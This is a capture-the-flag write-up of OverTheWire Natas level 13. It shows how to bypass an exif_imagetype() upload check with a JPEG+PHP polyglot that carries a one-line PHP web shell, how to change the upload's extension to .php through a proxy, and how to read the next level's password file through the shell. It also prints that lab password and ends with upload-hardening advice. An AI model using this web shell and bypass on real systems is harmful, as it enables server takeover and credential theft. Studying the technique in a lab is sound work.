# 🕵️ Natas - Level 13 (🇺🇸 English)  
*Date: 2025-06-04*  
*Difficulty: Medium*  
*Category: Web*  

---

## 🎯 Objective

The goal of this challenge is to bypass a file type validation based on "magic bytes" (`exif_imagetype()`) and, combining with the file name manipulation from the previous level, achieve Remote Code Execution (RCE) to obtain the password for the next level (Natas14).  

---

## 🔎 Analysis

- The Natas12 filename manipulation vulnerability persists: the name and extension of the file to be saved are set by a hidden field `<input type="hidden" name="filename" value="<?php print genRandomString(); ?>.jpg" />`. This allows an attacker, by intercepting the HTTP request (e.g., via Burp Suite), to change the extension from .jpg to .php.  

- New Security Check: The PHP script now includes a `! exif_imagetype($_FILES['uploadedfile']['tmp_name']`.   
- The exif_imagetype() function reads the first few bytes of the file (known as the "magic bytes" or "signature") to determine if it corresponds to a valid image format (JPEG, PNG, GIF, etc.).   
- If the file does not have a recognized image signature, exif_imagetype() returns false, causing the upload to be rejected with the message "File is not an image".   
- This prevents the direct upload of a pure PHP file, since it does not have image magic bytes.  
- To bypass the exif_imagetype() check, we need to create a polyglot file: a file that is valid both as a JPEG image and as a PHP script. The key to this is to insert the magic bytes of an image file at the top of our PHP code.   
- The exif_imagetype() image parser will read the magic bytes at the beginning of the file and recognize it as an image.   
- The PHP parser, when executing the file (once its extension has been manipulated to .php), will ignore the initial magic bytes (which are not valid PHP code) and start interpreting PHP code from the <?php tag.
  
---

## 🧱 Steps

1. Source Code Analysis: Confirm the persistence of the `filename` vulnerability (from Natas12) and identify the new `exif_imagetype()` validation.   
2. Prepare the Polyglot Payload: Create a file that contains JPEG magic bytes at the beginning, followed by our PHP shell.   
  - We use the terminal to create the file, ensuring that the literal hexadecimal bytes and PHP code are inserted correctly.   
  - Our PHP payload is `<?php system($_GET["cmd"]); ?>`.   
  - The JPEG magic bytes are `\xFF\xD8\xFF\xE0` (for JFIF JPEG).  
3. Create the Malicious File via Terminal:   
```bash
printf '\xFF\xD8\xFF\xE0' > bypass.php 
printf '<?php system($_GET["cmd"]); ?>' >> bypass.php
```
- The first printf creates the bypass.php file with the JPEG magic bytes.   
- The second printf (using `>>`) appends the PHP payload right after the magic bytes, without overwriting.  
4. Start Upload: In the browser, select the bypass.php file (or whatever name you gave the polyglot file) and prepare to upload.  
5. Intercept and Manipulate Request: Use an intercepting proxy tool (like Burp Suite) to capture the upload request.  
6. Change Extension: In the intercepted request, locate the `filename` parameter (which will come with a value like [random_name].jpg from the hidden field) and change its extension to `.php` (e.g. `[random_name].php`).  
7. Resend Request: Forward the modified request to the server. The server will accept the file, since the magic bytes satisfy `exif_imagetype()`.  
8. Access the Web Shell: The server will return the path to the file (e.g. `upload/bldzmc4xs4.php`). Navigate to this URL.  
9. Execute Commands (RCE): The PHP shell will be interpreted. Add the `cmd` parameter to the URL to execute commands.   
  - Test: `http://natas13.natas.labs.overthewire.org/upload/bldzmc4xs4.php?cmd=pwd` (will return `/var/www/natas/natas12/upload`).   
  - Get Natas14's password: `http://natas13.natas.labs.overthewire.org/upload/bldzmc4xs4.php?cmd=cat%20/etc/natas_webpass/natas14`.  
---

## 🔑 Password Found

```
z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ
```

---

## ✅ Conclusion

Natas13’s exploit succeeded by combining filename manipulation (persistent from the previous level) with a polyglot (JPEG + PHP) file creation technique. Inserting image “magic bytes” into the header of our PHP shell allowed the file to pass the `exif_imagetype()` check, while its manipulated extension (`.php`) ensured that it was interpreted by the PHP server, resulting in Remote Code Execution (RCE). This challenge demonstrates the importance of robust, multi-layered upload validations that do not rely solely on magic bytes or simple extensions.  

---

## 🧪 Commands Used

- Creating a polyglot file `bypass.php` in the terminal:  
```Bash
printf '\xFF\xD8\xFF\xE0' > bypass.php
printf '<?php system($_GET["cmd"]); ?>' >> bypass.php
```
Get Natas14 password:   
```bash
http://natas13.natas.labs.overthewire.org/upload/bldzmc4xs4.php?cmd=cat%20/etc/natas_webpass/natas14
```

---

## 🧠 Observations

- Content-Type Validation: Relying solely on `exif_imagetype()` is not enough. It is vital to check not only the magic bytes, but also perform deeper validation of the file content (e.g. using libraries that actually parse the image structure and check its integrity).   
- Layered Security: Upload validations should be layered: MIME type (checked via `Content-Type`), extension (validated by whitelist), magic bytes, and ideally image content verification by a robust library (to avoid polyglots).   
- Upload Isolation: Files uploaded by users should be stored in a directory that does not allow scripting and, if possible, served via a different domain or CDN.   
- Principle of Least Privilege: Ensure that the user under which the web server runs has the minimum permissions required, limiting the impact of an RCE.  

---

<p align="center"> <a href="../Natas12/Readme.md">⬅️ Previous</a> • <a href="../Natas14/Readme.md">Next ➡️</a> </p>
